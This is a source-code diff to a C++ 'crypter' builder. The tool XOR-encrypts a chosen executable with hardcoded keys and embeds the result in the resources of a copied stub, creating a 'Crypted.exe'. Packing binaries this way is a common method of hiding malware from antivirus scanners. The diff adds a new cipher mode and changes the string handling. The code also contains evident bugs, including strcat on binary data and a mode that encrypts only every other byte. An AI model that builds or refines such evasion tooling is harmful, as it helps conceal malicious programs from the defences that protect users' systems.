@@ -51,21 +51,22 @@ using namespace std;
 
 char * FB; //The Buffer that will store the File's data
 DWORD fs; // We will store the File size here
-wchar_t output[MAX_PATH];
+char output[MAX_PATH];
 char choice[1];
 DWORD dwBytesWritten = 0;
+char name[MAX_PATH];   // We will store the Name of the Crypted file here
 
 void RDF() //The Function that Reads the File and Copies the stub
 {
 	DWORD bt;
-	wchar_t name[MAX_PATH]; // We will store the Name of the Crypted file here
+									
 
 	cout << "Please enter the Path of the file \nIf the file is in the same folder as the builder\nJust type the file name with an extention\nEG: Stuff.exe\n";
 	cout << "File Name: ";
-	wcin >> name; // Ask for input from the user and store that inputed value in the name variable
+	cin >> name; // Ask for input from the user and store that inputed value in the name variable
 	cout << "Enter output name: ";
-	wcin >> output;
-	CopyFile(L"stub.exe", output/*L"Crypted.exe"*/, 0);// Copy stub , so we done need to download a new one each time we crypt
+	cin >> output;
+	CopyFile("stub.exe", output/*L"Crypted.exe"*/, 0);// Copy stub , so we done need to download a new one each time we crypt
 	// ofcourse we can just update the resources with new data but whatever
 	cout << "\nGetting the HANDLE of the file to be crypted\n";
 	HANDLE efile = CreateFile(name, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);	
@@ -93,14 +94,29 @@ void enc() // The function that Encrypts the info on the FB buffer
 		break;
 	case '2':
 		{
+
 				char cipher[] = "penguin";
+				ofstream out("Builder.txt");
 				for (int i = 0; i < fs; i++)
 				{
-					FB[i] ^= cipher[i % strlen(cipher)]; // Simple Xor chiper
+					 FB[i] ^= cipher[i % strlen(cipher)]; // Simple Xor chiper
 				}
 		}
 		break;
 	case '3':
+		{
+			char cipher[] = "test";
+			unsigned short pl = strlen(cipher);
+			char passTable[1024];
+			for (int i = 0; i != 1024; ++i)
+				passTable[i] = cipher[i%pl];
+
+			for (unsigned long long i = 0; i != fs; i += 2)
+			{
+				FB[i] ^= passTable[i % 1024];
+			}
+
+			}
 		return;
 	}
 }
@@ -136,9 +152,9 @@ int main() // The main function (Entry point)
 	choose_enc();
 	enc(); //Encrypt it 
 	strcat(FB, choice);
+	cout << fs << endl;
 	WriteToResources(output/*L"Crypted.exe"*/, 1, (BYTE *)FB, fs);//Write the encrypted data to resources
-	//WriteToResources(L"temp.dat", 1, (BYTE *)choice, dwBytesWritten);
 	cout << "Your File Got Crypted\n";
 	system("PAUSE");
 }
-;
+
